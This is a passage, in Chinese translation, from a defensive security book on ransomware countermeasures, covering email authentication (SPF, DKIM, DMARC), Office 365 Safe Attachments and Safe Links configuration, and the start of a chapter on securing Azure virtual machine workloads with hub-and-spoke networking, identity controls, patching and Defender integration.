  \n我们还需要记住的一点是，钓鱼电子邮件可能来自任何人。我曾见过供应商或分包商遭到入侵的情况，他们的电子邮件被用来向我所在的组织发送新的钓鱼电子邮件。\n\n\
  然而，重要的是要理解，虽然我们可以实施许多安全机制来尝试保护最终用户免受钓鱼电子邮件的侵害，但最重要的部分是持续教育用户如何识别钓鱼电子邮件。我还见过这样一个场景：客户的合作伙伴遭到入侵，攻击者随后使用合作伙伴的合法电子邮件地址联系客户并索取信息。在那种情况下，很难设置任何安全机制，因为电子邮件的域和内容都是合法的。幸运的是，最终用户自己明白了发生了什么。\n\
  \n另一个可能发生的问题是，如果我们的某个用户遭到入侵并被用于发送钓鱼电子邮件或垃圾邮件，我们的电子邮件域可能会被其他电子邮件安全网关阻止或列入黑名单，以保护其客户。这可能导致未来的合法电子邮件被安全供应商阻止，直到该域被重新列入白名单。不过，大多数供应商都提供在线信誉扫描，可用于验证你的域是否已被列入黑名单，例如以下网站：\n\
  \n- https://www.barracudacentral.org/lookups/lookup-reputation\n- https://talosintelligence.com/reputation_center\n\
  - https://check.spamhaus.org/\n- https://mxtoolbox.com/\n\nMXToolbox 可能是最有用的，因为它还允许我们检查\
  \ MX 记录、SPF 记录、DKIM 和 DMARC。此外，它还能让我们轻松检查电子邮件头，以确定电子邮件的来源。\n\n## 保护域名\n\n有三个主要元素可用于保护组织免受伪造电子邮件、钓鱼电子邮件和仿冒域名的攻击。它们是发件人策略框架（SPF）、域密钥识别邮件（DKIM）和基于域的消息认证、报告与一致性（DMARC）。这些功能有不同的用途：\n\
  \n- SPF – 这是一种机制，电子邮件服务器在收到电子邮件时可以使用它来检查发件人的电子邮件服务器是否被允许代表指定域发送电子邮件。它同时适用于发件方和收件方。在发件方，组织可以将其获准代表组织域发送电子邮件的\
  \ IP 地址，作为 DNS 条目发布到组织的 DNS 中。然后，接收电子邮件服务器可以检查据称发送该电子邮件的域的 DNS 记录，并验证发送服务器的 IP 地址是否在那里，即是否为授权发件人。\n\
  \n\n\n\n\n- **DKIM** – 使用 DKIM，会添加一个签名，可以确认电子邮件是以发送域所有者授权的方式发送的，并且电子邮件的相关部分未被更改。采用非对称加密在电子邮件头中作为单独的头部字段添加数字签名。用于签名的公钥随后会与发送组织的\
  \ DNS 记录一起发布。\n- **DMARC** – 这基于 SPF 和/或 DKIM，并告诉我们接收方应如何处理未通过这些检查的电子邮件。此外，该标准还提供了一种报告协议，可为收件方和发件方邮件组织提供更高程度的失败邮件报告。\n\
  \n验证所发布的各种 DNS 记录的一个很好的工具是 MxToolbox.com，它允许您在 SPF、DKIM 和 DMARC 记录发布后，只需使用搜索菜单即可轻松扫描域。例如，您可以输入\
  \ `spf:Microsoft.com` 来获取 Microsoft 的 SPF 记录。\n\n虽然我在这里不会过多详细介绍这些机制，但 Cisco 的这份演示文稿更详细地介绍了优缺点以及功能的工作方式：`https://www.ciscolive.com/c/dam/r/ciscolive/apjc/docs/2019/pdf/BRKSEC-1243.pdf`。\n\
  \n关于 Office 365，大多数这些功能都很容易实现，您可以在 `https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/use-dmarc-to-validate-email?view=o365-worldwide`\
  \ 阅读更多关于这些功能实现的信息。\n\n您可以设置 DMARC，以便从接收您域电子邮件的邮件服务器接收定期报告。我建议您定期监控收到的 DMARC 报告。然而，这需要您拥有\
  \ DMARC 报告服务。Microsoft 没有将自己的 DMARC 报告服务作为 Office 365 的一部分，但它已与 Valimail 签署了合作伙伴关系，Office\
  \ 365 客户如果注册 `https://use.valimail.com/ms-dmarc-monitor.html` 即可获得免费的 DMARC 报告服务。\n\
  \n## 保护内容和 URL\n\n除了在 Office 365 中实施 SPF、DMARC 和 DKIM 外，Microsoft 在 Exchange Online\
  \ Protection 中还有额外的安全机制来保护用户免受钓鱼攻击。\n\n这些功能例如如下：\n\n- 安全附件（适用于 Exchange 和 SharePoint\
  \ 与 OneDrive）\n- 安全链接\n- 反钓鱼保护\n- 反欺骗保护\n\n此外，Microsoft 最近推出了一项名为 **零小时自动清除 (ZAP)**\
  \ 的新功能，可让您追溯检测并中和已交付给 Exchange Online 用户的有害钓鱼、垃圾邮件或恶意软件消息。您可以在 https://learn.microsoft.com/en-us/microsoft-365/security/office-365-security/zero-hour-auto-purge?view=o365-worldwide\
  \ 阅读更多关于 ZAP 功能的信息。\n\n让我们先来看看 Safe Attachments 和 Safe Links，它们适用于拥有 Office 365\
  \ E5 许可证的组织。Safe Attachments 服务使用虚拟环境在电子邮件消息交付给最终用户之前检查附件（使用爆破检测恶意内容）。该功能默认对所有最终用户启用，如果发现恶意内容，消息会自动放入隔离区。\n\
  \n您还拥有适用于 SharePoint、OneDrive 和 Teams 的相同功能，可以检查上传文件中是否存在恶意内容，但该功能默认未启用。该功能可使用 Microsoft\
  \ PowerShell 或 Microsoft Defender 门户中的 Safe Attachments 选项启用。\n\n如果您使用 Microsoft\
  \ PowerShell，请执行以下步骤：\n\n- 1. 使用 Exchange Online PowerShell 模块连接到 Office 365，如此处所述：https://docs.microsoft.com/en-us/powershell/exchange/connect-to-exchange-online-powershell?view=exchange-ps。\n\
  - 2. 然后，运行此 PowerShell 命令以启用 Safe Attachments：\n- 3. 用户无法打开、复制或共享由 Safe Attachments\
  \ 检测到的恶意文件；然而，他们仍可下载包含恶意内容的文件。您可以通过输入以下命令来禁用此功能：\n\n```\nSet-AtpPolicyForO365 -EnableATPForSPTeamsODB\
  \ $true\n```\n\n```\nSet-SPOTenant -DisallowInfectedFileDownload $true\n```\n\n\
  这可确保用户无法下载可能包含恶意软件或其他恶意内容的文件。\n\n另一个应该使用的功能是，在我们拥有正确的许可证的情况下，使用 Microsoft Defender\
  \ for Office。您可以在本书的 GitHub 仓库中找到有关如何实施它的更多详细信息，您可以在此处找到：https://github.com/PacktPublishing/Windows-Ransomware-Detection-and-Protection/tree/main/chapter4。\n\
  \n## 其他对策\n\n除了前面列出的资源外，在减少钓鱼攻击风险或用户访问恶意内容方面，还有一些其他额外提示：\n\n- 默认情况下，Microsoft Teams\
  \ 允许开放式联合，这允许任何组织向另一组织中的另一用户发送直接即时消息。最近，我遇到了一起案例，其中大量用户收到来自另一组织中某人的消息，冒充 IT 部门的用户。\n\
  \n您可以在 `https://msandbu.org/phishing-attacks-in-microsoft-teams-and-external-federation/`\
  \ 阅读更多关于该攻击及其对策的信息。\n\n- 作为 SharePoint 管理员，您还可以定义同步策略来定义用户允许（或不允许）同步的附件文件类型。阻止文件扩展名为\
  \ `.exe`、`.hta`、`.js` 或 `.iso` 的文件是一个好的开始。您可以在 `https://docs.microsoft.com/en-us/onedrive/block-file-types`\
  \ 阅读更多关于如何设置此功能的信息。\n\n- 需要注意的是，诸如安全链接和安全附件等功能为电子邮件、Teams 和 SharePoint 提供了安全机制。它们仍可被绕过，使用合法的\
  \ URL，例如来自 Microsoft 的其他 OneDrive URL 或其他基于 Azure 的服务，如此处所述：`https://thalpius.com/2022/03/28/microsoft-defender-for-office-365-safe-links-bypass/`。\n\
  \n因此，重要的是要注意，虽然提到的这些安全功能会提高您的安全性，但它们并非万无一失。\n\n## 总结\n\n在本章中，我们更详细地研究了使用 Endpoint\
  \ Manager 的端点对策，其中包括 ASR 规则以及 Defender 和反恶意软件规则的管理。此外，我们还学习了如何确保我们的端点保持最新，并且我们的浏览器定期更新。然后，我们深入了解了如何使用\
  \ MFA 服务（如 Conditional Access 和使用 Azure MFA 服务的 NPS）来保护我们的服务。最后，我们研究了如何使用 SPF、DKIM、DMARC\
  \ 以及 Office 365 中的其他机制（如 Safe Attachments）来保护我们的电子邮件。\n\n作为保护免受勒索软件攻击的整体安全策略的一部分，实施保护最终用户和设备的安全机制将最大程度地降低勒索软件的风险。然而，我们仍然需要对环境有一个整体的看法。因此，实施虚拟基础设施的安全机制也很重要。在下一章中，我们将更深入地研究如何在\
  \ Microsoft Azure 中为运行的工作负载实施对策。\n"
- "## 勒索软件对策\n– Microsoft Azure 工作负载\n\n许多组织正在将虚拟机工作负载迁移到云端。随之而来的是，他们需要很好地了解不同的安全机制以及在放置基础设施之前架构应是什么样的。\n\
  \n不幸的是，我见过许多客户在将工作负载迁移到公共云后因缺乏知识或安全机制有限而遭受勒索软件攻击或信息泄露的案例。\n\n本章将介绍如何在 Microsoft\
  \ Azure 中为虚拟机工作负载构建安全架构的理论，以及以下主题：\n\n- Microsoft Azure 中的网络分段和设计最佳实践\n- 使用 DDoS\
  \ 和 WAF 机制保护外部服务的机制\n- Azure 中身份和访问管理的身份安全最佳实践\n- 使用 Azure Arc 保护混合工作负载\n- Microsoft\
  \ Azure 中的身份和访问管理\n- 使用 Azure Backup 和 Azure Policy 进行数据保护\n\n## 技术要求\n\n在本章中，我们将重点介绍\
  \ Microsoft Azure 中使用的架构和服务。为了能够使用本章中列出的功能和服务，您需要一个 Microsoft Azure 的活跃订阅。如果您没有活跃订阅，您可以在\
  \ https://azure.microsoft.com/en-us/free/ 注册一个免费的 200 美元试用版。还需要注意的是，许多服务都有运行成本，因此如果您设置测试环境，请在完成后删除资源，以免产生任何经常性费用。\n\
  \n\n\n\n\n## 网络分段与设计\n\n在 Microsoft Azure 中，设置虚拟网络和虚拟机、为其分配公共 IP 地址并使其公网可用非常简单。Azure\
  \ 还在全球提供了超过 50 个区域，我们可以利用这些区域在不同地理位置创建服务，并将其提供给最终用户。\n\n然而，我们始终应该从构建一个安全的基础开始，确保服务仅以安全的方式暴露，例如通过安全网关，或者如果是\
  \ Web 服务，则部署在 Web 应用防火墙之后。\n\n同样重要的是，网络设计要确保服务间的流量通过集中式防火墙，而不是经过公共互联网，同时还要实施微隔离，以确保所有服务以最小暴露面运行。\n\
  \n尽管 Azure 已经成为一个庞大的生态系统，在如何设计安全基础设施方面提供了多种可能性，幸运的是，微软创建了一个名为“企业级登陆区域”（enterprise-scale\
  \ landing zone）的参考架构，涵盖了所有这些方面，包括服务隔离方面的最佳实践。\n\n该参考架构并不适用于所有场景和规模，但为架构设计提供了指导原则和最佳实践。\n\
  \n该参考架构由以下部分组成：\n\n- **中心辐射型网络拓扑、安全性和连接性**：中心辐射型是一种将服务分隔到不同网络区域的方式，确保放置在自己辐射区中的服务只能通过集中的安全中心（通常由防火墙服务组成）与另一个服务通信。\n\
  - **管理组和带有 Azure Policy 的订阅层次结构**：管理组和订阅层次结构是将资源逻辑分组到不同计费和访问环境中的方法。Azure Policy\
  \ 是一种对 Azure 资源强制执行规则和限制的方式，以确保符合组织标准和服务级别协议。它们定义了对一组 Azure 资源允许或拒绝的操作，可用于强制执行命名约定、资源组结构和成本控制策略等。Azure\
  \ Policy 用于实时评估和审计资源，并提供自动修正选项，以确保资源长期保持合规。\n- **用于数据加密和安全特权访问的安全机制**：这涉及确保使用加密方法访问和存储数据，并确保通过使用条件访问或\
  \ Privileged Identity Management 等服务，使用 MFA 身份验证来访问平台和服务。\n\n虽然我们不会在这里涵盖所有内容，但我们将深入探讨一些重要方面，例如针对勒索软件防护的网络和安全机制。\n\
  \n微软已记录并提供了参考实现示例，你可以在此处找到：https://docs.microsoft.com/en-us/azure/cloud-adoption-framework/ready/landing-zone/choose-landing-zone-option。\n\
  \n根据公司的规模、全球布局或合规需求，微软提供了不同的参考架构示例。许多示例（如企业级基础）都包含可以自动部署登陆区域的自动化模板。但是，我强烈建议你将参考架构主要作为指导，并根据你的需求定制自己的登陆区域。\n\
  \n此外，如果只是使用预定义模板，你将很难感受到对服务部署方式的所有权。\n\n## Microsoft Azure 中的身份和访问管理\n\nAzure 提供了广泛的安全机制。理解这一点很重要：有些服务用于保护工作负载本身，例如虚拟机。还有一些服务用于保护对\
  \ Azure 具有访问权限的管理员或用户的身份，以确保他们不被允许设置公网可用的服务，或者如果他们想要执行任何管理操作，则需要使用 MFA 登录 Azure\
  \ 门户。\n\n当你通过 Web 门户、CLI 或 SDK 与 Microsoft Azure 交互时，你始终在使用一个名为 Azure Resource Manager\
  \ 的 API 层，如下图所示。该图还描绘了与 Microsoft 365 交互时的另一个 API 层，即 Graph API。\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_157_0.png)\n\
  \n图 5.1 – Microsoft Azure 和 365 的 API 层以及可用于与之交互的工具\n\nAzure Resource Manager 使用\
  \ Azure AD 作为底层身份验证提供程序，但 Microsoft Azure 中的访问权限与 Azure AD 中的访问权限不同。\n\n因此，如果用户在\
  \ Office 365 或 Microsoft 365 中拥有管理员访问权限，这并不会直接授予他们对 Microsoft Azure 资源的访问权限。其中一个方面是确保拥有\
  \ Azure 访问权限的用户仅对资源的某些部分拥有委派访问权限，或者确保他们在需要时使用内置功能提升访问权限。\n\n现在让我们回到一些不同的安全服务。有些服务专注于威胁情报，另一些则专注于网络安全。那么让我先简要解释一下它们，然后再深入探讨：\n\
  \n- **Microsoft Defender for Cloud**：这是一项用于安全态势管理和威胁防护的服务。此功能为不同的 PaaS 服务提供威胁检测，并与\
  \ Microsoft Intelligence Security Graph（微软自家的威胁情报服务）集成。此外，如果你有公网可用的服务（例如虚拟机或具有公共\
  \ IP 地址的资源），该服务还提供网络层分析。该服务使用机器学习模型，通过分析 Azure 核心路由器收集的示例 IPFIX 数据来识别恶意流量活动。这些数据用于识别可能表明恶意活动的模式和趋势。\n\
  - **Microsoft Defender for Servers**：我们在*第 3 章“使用 Microsoft Sentinel 和 Defender\
  \ 进行安全监控”*中介绍了此功能的一些要点，以及它如何使用 Azure Arc 处理混合资源。但 Defender for Servers 是一种 EDR 工具，可用于检测无文件攻击，并使用原生\
  \ Microsoft Defender 漏洞管理或 Qualys 检测第三方应用程序中的漏洞。\n- **Microsoft Sentinel**：我们在*第\
  \ 3 章“使用 Microsoft Sentinel 和 Defender 进行安全监控”*中介绍了此功能的一些要点。这是微软基于云的 SIEM 服务。它与\
  \ Log Analytics 一起用于收集 Azure 中不同服务的日志。Azure 中的所有服务都有与 Log Analytics 的集成点，允许我们将日志导出到其中。这包括\
  \ Azure AD、网络流量和 PaaS 诊断日志等日志。\n- **Azure Firewall**：这是 Azure 中的一项托管防火墙服务，运行在虚拟网络中的专用子网上。该防火墙服务提供不同的安全功能，例如网络规则、应用程序规则、NAT\
  \ 功能、TLS 检查和 IPS 机制，具体取决于所使用的 SKU。\n- **Azure AD 条件访问**：这是一种安全机制，我们可以在其中定义当管理员或用户尝试登录集成到\
  \ Azure AD 的应用程序（例如 Azure 门户）时应用的语句。例如，当管理员登录时，他们只能从符合 Intune 策略的设备登录，并且必须通过 MFA\
  \ 提示成功完成身份验证。我们还可以使用条件访问来限制来自某些 IP 地址或网络位置的认证。此功能不直接用于虚拟机，除非你的计算机已加入 Azure Active\
  \ Directory 而不是 Active Directory。\n\n\n\n\n\n- **Azure AD 特权身份管理（PIM）：** 此功能用于控制对\
  \ Azure AD 和 Azure 中角色的访问。一种常用的方法是，如果管理员需要对 Azure 中的某些内容进行更改，则他们需要先在 PIM 中提升自己的访问权限，然后才能访问这些资源。\n\
  - **Azure Policy：** 这是一种服务，用于根据业务规则评估 Azure 资源；另一种理解方式是 Microsoft Azure 的组策略。默认情况下，如果某人拥有\
  \ Azure 订阅的所有者访问权限，他们可以在任何区域创建服务，并且如果他们愿意，还可以创建所有具有公共 IP 地址的服务。Azure Policy 允许我们定义中央策略，以确定管理员可以创建哪些资源以及在何处创建。一个典型场景是利用策略限制只能部署在特定区域内的资源，并防止任何服务使用公共\
  \ IP 地址进行部署。虽然此服务更多是关于控制对 Azure 中某些资源的访问，而不是直接针对虚拟机，但微软正在大力推广一项名为 Guest Configuration\
  \ 的新功能，该功能允许我们使用 Desired State Configuration 定义基于操作系统的策略。这意味着我们可以使用 Azure Policy\
  \ 对 Azure 资源进行集中配置，包括虚拟机上的来宾操作系统。\n- **网络安全组（NSG）：** 这是一个简单的五元组防火墙规则，可以直接应用于虚拟机的**网络接口卡（NIC）**或\
  \ Azure 虚拟网络子网。\n- **网络流日志和流量分析：** 借助 NSG 流日志，我们将收集通过 NSG 的所有网络流数据，无论其是被阻止还是允许。默认情况下，这些流日志会收集到存储帐户中。但是，可以使用名为“流量分析”的功能将这些流日志收集到\
  \ Log Analytics 中。然后，Microsoft 将收集数据，并使用其威胁情报信息丰富数据，然后再将其推送到 Log Analytics 工作区。\n\
  - **Azure 应用程序网关和 Web 应用程序防火墙：** 此功能为 Web 应用程序提供负载均衡和基于第 7 层的防火墙。它通常用于向外部发布 Web\
  \ 服务。Web 应用程序防火墙服务用于基于 OWASP 规则阻止常见的第 7 层攻击。\n- **Azure DDoS 防护：** 此功能提供针对第 3 层和第\
  \ 4 层攻击的 DDoS 防护，通常是基于 UDP 和 TCP 的攻击。一个例子是名为 Killnet 的活动组织，该组织于 2022 年 6 月使用 TCP\
  \ SYN 洪水攻击对挪威发起了大量第 4 层 DDoS 攻击，而 Azure 中的内置 DDoS 防护功能可以阻止这些攻击。需要注意的是，此服务成本相当高，并且仅适用于具有公共\
  \ IP 地址的公开服务。\n- **Azure 磁盘加密：** 此功能为虚拟机提供 BitLocker 加密，其中加密机制将加密/解密密钥存储在 Azure\
  \ 中另一个名为 Azure Key Vault 的服务中。这确保任何有内容的虚拟机都已加密，因此即使有人设法访问 Azure 环境，也无法下载和检查计算机的内容。\n\
  - **Azure 存储服务加密：** 此功能对 Azure 数据中心内物理驱动器上存储的数据进行加密，并且默认启用。由于此功能针对物理驱动器，因此不会对实际运行的工作负载和数据产生任何影响。\n\
  \n> **注意**\n> \n> 前面列出的大多数功能默认不启用，并且涉及额外的配置和额外成本。我总是建议先查阅不同的服务并了解每项服务的价格，然后再开始使用它们，以免措手不及。您可以使用\
  \ Azure 定价计算器查看不同服务的成本：https://azure.microsoft.com/en-us/pricing/calculator/。\n\n\
  现在让我们将这些功能组合在一起，看看它们如何在 Microsoft Azure 中的简化示例架构中协同工作。\n\n下图展示了一个简单的工作负载，其中 Azure\
  \ 中有一个虚拟网络，网络内有一台虚拟机。该计算机使用 Azure 防火墙作为网关，允许与外界通信。服务器运行着一个 Web 服务，该服务使用 Azure 应用程序网关（充当反向代理）在外部公开。\n\
  \n![](img/7b49a27a3c2adc52d097f2e77f3bf394_160_0.png)\n\n图 5.2 – Microsoft Azure\
  \ 中虚拟机的示例架构\n\n在此示例中，我们为 NIC 和计算机所在的子网都定义了 NSG 规则。该计算机启用了操作系统磁盘加密，并使用 Microsoft\
  \ Sentinel 收集安全事件，以及使用 Defender 进行 EDR 和漏洞检测。\n\nDDoS 防护已启用，并且仅适用于具有公共 IP 地址的服务。我们还将\
  \ Azure 策略附加到订阅，以确保管理员无法在此订阅中部署任何具有公共 IP 地址的资源。这是这里最重要的部分，以确保服务不会直接暴露。\n\n当你在 Azure\
  \ 中设置具有直接公共 IP 地址且防火墙机制有限的工作负载或虚拟机时，只需几分钟你就会遭到自动化暴力破解攻击，因为公共云是常见的攻击目标。需要注意的是，前面显示的体系结构中缺少一些组件（例如路由表和\
  \ DNS 配置）以确保其正常工作，但我们稍后会再讨论。\n\n虽然这种设计可以工作，但从网络或管理的角度来看，它无法正确扩展。为此提供一些背景知识：默认情况下，当单个虚拟网络中有许多虚拟机或资源时，它们会自动具备路由表，这确保同一\
  \ VNet 内的所有资源能够直接相互到达。为了确保所有流量都通过中心防火墙作为下一跳，我们使用了称为用户定义路由 (UDR) 的功能，该功能会覆盖默认行为。这是中心辐射型网络体系结构的一个基本方面。\n\
  \n## 中心辐射型虚拟网络\n\n在 Azure 中构建可扩展的网络体系结构时，许多组织使用一种常见的网络拓扑，该拓扑依赖于虚拟网络链式连接，也称为中心辐射型网络体系结构。这种拓扑使用将一组网络连接到虚拟网络中心（如链）的概念。在这种设计中，如下面的图所示，可以轻松添加和删除辐射分支，而不会影响网络的其余部分。此体系结构使用称为\
  \ VNet 对等互连的功能将不同的辐射分支连接到中心。这确保从一个辐射分支到另一个辐射分支的流量需要先经过中心，然后再到达另一个辐射分支。由于 VNet 对等互连是不可传递的，因此可以确保辐射分支一无法直接与辐射分支二通信，除非经过中心防火墙，如下面的图所示。\n\
  \n![](img/7b49a27a3c2adc52d097f2e77f3bf394_162_0.png)\n\n图 5.3 – Microsoft Azure\
  \ 中的中心辐射型网络\n\n这种拓扑通常使用集中式监控、管理和连接机制，例如防火墙和 VPN 或直接连接功能。VNet 链式连接允许采用分层隔离方法，这是许多组织对某些服务的要求。\n\
  \n每个辐射分支网络都可以在各自的 Azure 订阅中定义，从而确保对中心虚拟网络的访问可以仅限于系统管理员，并且不同的团队可以管理自己的辐射分支。\n\n此方法还使用在子网级别分配的用户定义路由\
  \ (UDR) 来覆盖 Azure 中的默认路由，以确保来自辐射分支中工作负载的流量路由到中心防火墙。\n\n这意味着所有去往互联网甚至本地网络的流量都需要经过中心。这确保您可以对\
  \ Microsoft Azure 中资源的所有进出网络流量进行集中治理。\n\n虽然正确设计 VNet 很重要，但第二部分是控制 Azure 中的虚拟机工作负载。\n\
  \n## Azure 中虚拟机的结构\n\n在 Azure 中创建虚拟机可以像运行两个 PowerShell 命令一样简单，但在设置任何计算机之前，您应该了解一些注意事项。\n\
  \n\n\n\n\n首先，你有 VM 的生成类型，这就像你在 Hyper-V 中拥有的那样，或者 VMware 中的 VM 版本。在 Microsoft Azure\
  \ 中，我们有两代：第一代支持基于 BIOS 的启动，并且不提供任何 TPM 机制，而第二代除了受信任启动外还提供 UEFI 启动。\n\n| 功能 | 第一代\
  \ VM | 第二代 VM |\n|---|---|---|\n| 启动类型 | PCAT | UEFI |\n| 磁盘控制器 | IDE | SCSI |\n\
  | 支持的 VM SKU | 几乎全部 | 几乎全部 |\n| OS 磁盘大于 2 TB | 否 | 是 |\n| VBS | 否 | 是 |\n| 受信任启动\
  \ | 否 | 是 |\n| vTPM | 否 | 是 |\n\n图 5.4 – Azure 中第一代和第二代 VM 之间的差异\n\n借助对基于虚拟化的安全\
  \ (VBS) 的支持，你还可以使用诸如 Credential Guard 之类的功能用于虚拟机。默认情况下，当你创建一台机器时，它会选择第一代，并且没有从第一代转换到第二代的机制。\n\
  \n因此，建议是，你将所有虚拟机都创建为第二代。有些功能目前还不支持第二代，例如 Site Recovery，这是在 Azure 中的一项灾难恢复服务，但支持很快就会到来。\n\
  \n创建第二代虚拟机可以通过 PowerShell、脚本或使用 Azure 门户来完成，如以下屏幕截图所示。在这里，选择了映像类型并定义了安全类型以启用受信任启动功能。\n\
  \n![](img/7b49a27a3c2adc52d097f2e77f3bf394_164_0.png)\n\n图 5.5 – 在 Microsoft Azure\
  \ 中创建第二代机器的向导\n\n当你拥有第二代虚拟机时，你可以启用使用诸如 Credential Guard 之类的功能，这可以限制攻击者获取机器上本地凭据的可能性。你可以在此处阅读有关如何激活该功能的更多信息：`https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-manage`。\n\
  \nAzure 中的所有机器都预装了一个代理，允许 VM 与 Azure 中的其他服务之间进行通信。代理还将健康状态发送回 Azure 控制平面，并且默认情况下也用于\
  \ DHCP 和 DNS 查找。\n\nAzure 代理将与一些仅对 VM 内部的虚拟 IP 地址进行通信，如下图所示，这些地址用于管理目的，例如以下内容：\n\
  \n- 与 Azure 平台通信以表明其处于 **Ready** 状态\n- 启用与 DNS 虚拟服务器的通信，以为没有自定义 DNS 服务器的资源（例如 VM）提供过滤的名称解析\n\
  - 启用来自 Azure 负载均衡器 (`https://docs.microsoft.com/en-us/azure/load-balancer/load-balancer-custom-probe-overview`)\
  \ 的健康探测，以确定 VM 的健康状态\n\n这意味着，如果我们在 Azure 中有一个域控制器，我们就可以利用此功能运行脚本，使用标准 PowerShell\
  \ 模块更改任何帐户的密码。无法禁用此功能，因此重要的是要确保对放置这些虚拟机的某些 VM 或订阅的访问受到限制。\n\n## 检测 Azure 中被入侵虚拟机的滥用\n\
  \n你可以在我撰写的关于该主题的博文中更深入地阅读有关此功能如何被用于恶意目的的信息：https://bit.ly/3a2Hhlb。\n\nAzure 代理还用于安装扩展，这些扩展是安装在虚拟机上的软件插件。我常用的扩展之一是反恶意软件扩展，它为基于\
  \ Azure 的机器提供免费的反恶意软件功能，使用 Microsoft 的反恶意软件引擎。虽然你没有像许多第三方那样拥有相同的管理层，但你可以使用 Azure\
  \ Policy 或作为扩展配置的一部分来管理反恶意软件引擎，并且所有数据都从扩展收集到 Log Analytics 中。\n\n扩展安装也可以通过门户完成，进入虚拟机对象，单击\
  \ **Extensions**，并找到 **Microsoft Antimalware**，如以下屏幕截图所示：\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_166_0.png)\n\
  \n图 5.8 – 反恶意软件扩展安装\n\n然后单击 **Next**，配置反恶意软件代理的设置，然后单击 **Create** 以在虚拟机上安装扩展。\n\n\
  根据你在虚拟机上运行的操作系统类型，你还可以从列表中获得其他不同的扩展。例如，如果你在创建虚拟机期间未选择该选项，你还可以选择安装基于 Azure AD 的登录扩展或自动管理扩展，我们稍后将介绍。\n\
  \n扩展还可用于运行自定义脚本，例如在创建虚拟机时或机器创建并运行后。这可以例如与 **基础设施即代码 (IaC)** 工具结合使用，以自动化虚拟机的创建并安装代理。\n\
  \n下一部分是为虚拟机获取自动修补，以确保安装安全更新。在 Azure 中，补丁管理有几种不同的选项：\n\n- 自动，由平台完成\n- 使用 Azure Automation\
  \ 的 Update Management（适用于 Windows Server 和 Linux）\n- Endpoint Manager（适用于在 Microsoft\
  \ Azure 中运行的 Windows 10/11）\n\n“自动，由平台完成”指的是 Azure 的自动补丁管理，具有以下功能：\n\n- 被归类为 *critical*\
  \ 或 *security* 的补丁将由平台自动下载并安装到 VM 上。\n- 补丁会根据 VM 的时区在非高峰时段自动安装。\n- Azure 管理补丁编排过程并根据可用性优先原则应用补丁。这意味着系统优先考虑维护服务和系统的可用性，而不是立即应用所有可用补丁。\n\
  \n该服务在更新后监控 VM 的健康状况，以验证补丁是否已成功安装。\n\n如果你有分布在不同区域或可用性集中的工作负载，该服务将确保补丁一次只应用于一个区域、一个可用性区域和一个可用性集。这是为了确保工作负载的可用性。\n\
  \n此功能可以通过 IaC、PowerShell 或 Azure 门户启用。如果你已经有一台正在运行的 VM，你可以通过 PowerShell 使用以下命令启用该功能：\n\
  \n```\nSet-AzVMOperatingSystem -VM $VirtualMachine -Windows -ComputerName $ComputerName\
  \ -Credential $Credential -ProvisionVMAgent -EnableAutoUpdate -PatchMode \"AutomaticByPlatform\"\
  \n```\n\n如果你希望对补丁安装时间有更多控制，则需要使用 Azure Update Management。Update Management 是两种服务的组合，即\
  \ Azure Automation 和 Log Analytics。如以下图所示，此服务通过使用 Log Analytics 代理工作，该代理会收集 VM 上有哪些更新可用，然后将这些信息报告回\
  \ Update Management 解决方案，在那里我们定义补丁应安装的时间表。\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_168_0.png)\n\
  \n图 5.9 – Azure Update Management\n\nHybrid Runbook Worker 代理负责安装已定义的补丁。\n\n> 注意\n\
  > Update Management 服务要求 VM 能够访问更新目录，例如 WSUS 或 Microsoft Update。该服务不会推送或下载实际的更新，而是更像是对虚拟机可用补丁的编排服务。\n\
  \n你可以通过进入 Azure 门户中的虚拟机然后单击 Updates 来轻松创建并启用该服务。如以下屏幕截图所示，这将自动创建一个 Automation 帐户和\
  \ Log Analytics 工作区。或者，你也可以选择现有的。\n\n\n\n\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_171_0.png)\n\
  \n*图5.12 – Microsoft Defender for Cloud 建议列表*\n\n在这里，我们还可以看到机器上安装了哪些类型的应用程序，以及该特定机器上是否存在任何已知漏洞。\n\
  \n这部分在 UI 中不太明显：具有 EDR 功能的服务器还可以将数据发送到另一个数据源，该数据源属于 Defender for Endpoint 数据库的一部分。\n\
  \n然而，这要求我们安装额外的代理，将服务器载入服务，以便将数据发送到服务。这可以自动配置，Microsoft 将安装额外的代理。我们需要做的只是集成 Defender\
  \ for Cloud 和 Defender for Endpoint。\n\n要启用集成，请在 Azure 门户中转到 **Defender for Cloud**，转到\
  \ **环境设置**，然后选择我们最近为 Defender for Servers 设置的包含机器的订阅。选择 **集成**，选择 **允许 Microsoft\
  \ Defender for Endpoint 访问我的数据** 设置，然后点击“保存”。\n\n> **注意**\n>\n> Microsoft Defender\
  \ for Cloud 会自动将您的机器注册到 Microsoft Defender for Endpoint 服务。对于在启用集成时已存在的机器，注册过程（称为“载入”）可能需要最多\
  \ 12 小时。对于在集成激活后创建的新机器，载入通常需要大约 1 小时。\n\n一旦集成到位，服务器也应自动载入 Defender for Endpoint\
  \ 服务。另一种选择是通过手动安装软件来载入机器，可以通过登录 `https://security.microsoft.com` 完成，在 **设置 | 终结点\
  \ | 载入** 下，我们有适用于不同操作系统的不同载入机制。为您的操作系统下载合适的软件版本，并使用向导进行安装。\n\n当服务器通过集成或手动安装完成载入后，它们将显示在\
  \ Defender for Endpoint 门户（https://security.microsoft.com）的“终结点”下。在这里，我们可以查看各种漏洞，如以下屏幕截图所示。\n\
  \n![](img/7b49a27a3c2adc52d097f2e77f3bf394_172_0.png)\n\n图5.13 – Microsoft Defender\
  \ EDR 和发现的漏洞\n\n我们还有一个时间线视图，显示机器上发生的所有事件。这意味着代理将收集与设备上的注册表、文件、网络和进程相关的所有更改和活动。\n\
  \n数据存储在 Log Analytics 等数据库中，它也支持 Kusto 查询。这意味着我们也可以使用 Kusto 查询来分析数据，我们在第3章“使用 Microsoft\
  \ Sentinel 和 Defender 进行安全监控”中已经介绍过。不过，为了提供一些背景信息，Defender for Servers 将自动映射可能被视为异常流量模式的事件，如以下屏幕截图所示。\n\
  \n![](img/7b49a27a3c2adc52d097f2e77f3bf394_172_1.png)\n\n图5.14 – Microsoft Defender\
  \ for Servers 中虚拟机的时间线视图\n\n## 注意\n\n上一屏幕截图中顶部菜单中可用的不同设置将取决于您运行的操作系统版本。您可以在此处查看不同\
